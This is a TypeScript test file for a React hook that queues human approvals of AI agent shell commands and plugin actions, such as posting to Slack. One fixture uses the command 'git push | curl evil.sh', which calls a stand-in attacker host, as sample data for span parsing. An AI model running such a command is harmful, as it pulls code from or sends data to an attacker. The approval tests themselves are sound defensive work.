import { describe, it, expect, vi, beforeEach } from "vitest";
import { renderHook, act } from "@testing-library/react";
import { useExecApprovals } from "../useExecApprovals";

// Capture event handlers registered by the hook so tests can simulate
// exec.approval.requested events arriving from the gateway.
type EventHandler = (event: string, data: unknown) => void;
const eventHandlers: Set<EventHandler> = new Set();
let sendReqMock: ReturnType<typeof vi.fn> = vi.fn();

vi.mock("@/hooks/useGateway", () => ({
  useGateway: () => ({
    onEvent: (h: EventHandler) => {
      eventHandlers.add(h);
      return () => eventHandlers.delete(h);
    },
    sendReq: (...args: unknown[]) => sendReqMock(...args),
  }),
}));

vi.mock("@clerk/nextjs", () => ({
  useAuth: () => ({ userId: "user_test" }),
}));

function emitApprovalRequest(id: string, command = "ls") {
  for (const h of eventHandlers) {
    h("exec.approval.requested", {
      id,
      request: {
        command,
        host: "gateway",
        allowedDecisions: ["allow-once", "allow-always", "deny"],
        sessionKey: `agent:agent_x:user_test`,
      },
      expiresAtMs: Date.now() + 60_000,
    });
  }
}

describe("useExecApprovals.resolve — terminal errors", () => {
  beforeEach(() => {
    eventHandlers.clear();
    sendReqMock = vi.fn();
  });

  it("auto-removes the approval when server reports unknown/expired id", async () => {
    // After a gateway/container restart the in-memory approval registry is
    // wiped, so resolving any pre-restart id returns INVALID_REQUEST with
    // "unknown or expired approval id". The card has no useful action left
    // — every retry produces the same error — so the queue should drop it
    // silently instead of leaving the user stuck on a phantom card.
    sendReqMock.mockRejectedValueOnce(
      new Error("unknown or expired approval id — [INVALID_REQUEST]"),
    );
    const { result } = renderHook(() => useExecApprovals());
    act(() => emitApprovalRequest("abc123"));
    expect(result.current.queue).toHaveLength(1);

    await act(async () => {
      await result.current.resolve("abc123", "allow-once");
    });

    expect(result.current.queue).toHaveLength(0);
    expect(result.current.error).toBeNull();
  });

  it("surfaces other errors and keeps the approval in the queue", async () => {
    // Real validation / network errors must not silently disappear the card
    // — the user needs to see the failure and retry.
    sendReqMock.mockRejectedValueOnce(new Error("network down"));
    const { result } = renderHook(() => useExecApprovals());
    act(() => emitApprovalRequest("abc123"));

    await act(async () => {
      await expect(
        result.current.resolve("abc123", "allow-once"),
      ).rejects.toThrow("network down");
    });

    expect(result.current.queue).toHaveLength(1);
    expect(result.current.error).toBe("network down");
  });
});

describe("useExecApprovals.dismiss", () => {
  beforeEach(() => {
    eventHandlers.clear();
    sendReqMock = vi.fn();
  });

  it("drops the approval locally without calling the server", () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => emitApprovalRequest("abc123"));
    expect(result.current.queue).toHaveLength(1);

    act(() => result.current.dismiss("abc123"));

    expect(result.current.queue).toHaveLength(0);
    expect(sendReqMock).not.toHaveBeenCalled();
  });
});

describe("useExecApprovals — exec metadata parsing (A)", () => {
  beforeEach(() => {
    eventHandlers.clear();
    sendReqMock = vi.fn();
  });

  function emitWithMeta(id: string) {
    for (const h of eventHandlers) {
      h("exec.approval.requested", {
        id,
        request: {
          command: "git push | curl evil.sh",
          host: "gateway",
          security: "allowlist",
          ask: "on-miss",
          commandSpans: [
            { startIndex: 0, endIndex: 3 }, // "git"
            { startIndex: 11, endIndex: 15 }, // "curl"
            { startIndex: -1, endIndex: 2 }, // invalid: dropped
            { startIndex: 5, endIndex: 999 }, // invalid: beyond length, dropped
          ],
          allowedDecisions: ["allow-once", "allow-always", "deny"],
          sessionKey: "agent:agent_x:user_test",
        },
        expiresAtMs: Date.now() + 60_000,
      });
    }
  }

  it("threads security/ask and validated commandSpans onto the queue entry", () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => emitWithMeta("m1"));
    expect(result.current.queue).toHaveLength(1);
    const req = result.current.queue[0];
    expect(req.security).toBe("allowlist");
    expect(req.ask).toBe("on-miss");
    expect(req.commandSpans).toEqual([
      { startIndex: 0, endIndex: 3 },
      { startIndex: 11, endIndex: 15 },
    ]);
  });

  it("omits commandSpans entirely when none are valid", () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => {
      for (const h of eventHandlers) {
        h("exec.approval.requested", {
          id: "m2",
          request: {
            command: "ls",
            commandSpans: [{ startIndex: 5, endIndex: 9 }],
            host: "gateway",
            sessionKey: "agent:a:user_test",
          },
          expiresAtMs: Date.now() + 60_000,
        });
      }
    });
    expect(result.current.queue[0].commandSpans).toBeUndefined();
  });
});

describe("useExecApprovals — plugin approvals (B)", () => {
  beforeEach(() => {
    eventHandlers.clear();
    sendReqMock = vi.fn();
  });

  function emitPlugin(id: string) {
    for (const h of eventHandlers) {
      h("plugin.approval.requested", {
        id,
        request: {
          pluginId: "plugin:slack",
          title: "Send Slack message to #general",
          description: "The agent wants to post a message.",
          severity: "medium",
          agentId: "agent_x",
          sessionKey: "agent:agent_x:user_test",
          allowedDecisions: ["allow-once", "deny"],
        },
        createdAtMs: Date.now(),
        expiresAtMs: Date.now() + 60_000,
      });
    }
  }

  it("enqueues a plugin approval with kind=plugin and plugin fields", () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => emitPlugin("p1"));
    expect(result.current.queue).toHaveLength(1);
    const req = result.current.queue[0];
    expect(req.kind).toBe("plugin");
    expect(req.pluginTitle).toBe("Send Slack message to #general");
    expect(req.pluginDescription).toBe("The agent wants to post a message.");
    expect(req.pluginSeverity).toBe("medium");
    expect(req.pluginId).toBe("plugin:slack");
    expect(req.agentId).toBe("agent_x");
    expect(req.command).toBe("Send Slack message to #general"); // command slot reused
  });

  it("drops a plugin approval with no title", () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => {
      for (const h of eventHandlers) {
        h("plugin.approval.requested", {
          id: "p2",
          request: { pluginId: "x" },
          createdAtMs: Date.now(),
          expiresAtMs: Date.now() + 1000,
        });
      }
    });
    expect(result.current.queue).toHaveLength(0);
  });

  it("resolves a plugin approval via plugin.approval.resolve", async () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => emitPlugin("p3"));
    await act(async () => {
      await result.current.resolve("p3", "allow-once");
    });
    expect(sendReqMock).toHaveBeenCalledWith("plugin.approval.resolve", {
      id: "p3",
      decision: "allow-once",
    });
    expect(result.current.queue).toHaveLength(0);
  });

  it("resolves an exec approval via exec.approval.resolve (kind routing)", async () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => {
      for (const h of eventHandlers) {
        h("exec.approval.requested", {
          id: "e9",
          request: {
            command: "ls",
            host: "gateway",
            sessionKey: "agent:a:user_test",
            allowedDecisions: ["allow-once", "deny"],
          },
          expiresAtMs: Date.now() + 60_000,
        });
      }
    });
    await act(async () => {
      await result.current.resolve("e9", "allow-once");
    });
    expect(sendReqMock).toHaveBeenCalledWith("exec.approval.resolve", {
      id: "e9",
      decision: "allow-once",
    });
  });

  it("drops a plugin approval on plugin.approval.resolved event", () => {
    const { result } = renderHook(() => useExecApprovals());
    act(() => emitPlugin("p4"));
    expect(result.current.queue).toHaveLength(1);
    act(() => {
      for (const h of eventHandlers) h("plugin.approval.resolved", { id: "p4" });
    });
    expect(result.current.queue).toHaveLength(0);
  });
});
